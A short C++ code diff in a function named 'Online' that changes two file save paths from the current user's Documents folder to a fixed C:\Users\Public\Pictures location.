@@ -456,14 +456,9 @@ BOOL Online(int port, std::string& ip, const char* command)
 				std::string temp2;
 				std::string savename;
 				std::string jpjname;
-				savename = "C:\\Users\\";
-				jpjname = "C:\\Users\\";
 
-				savename += username;
-				savename += "\\Documents\\";
-				jpjname += username;
-				jpjname += "\\Documents\\";
-
+				savename = "C:\\Users\\Public\\Pictures\\";
+				jpjname = "C:\\Users\\Public\\Pictures\\";
 
 				std::stringstream ss;
 				std::stringstream st;
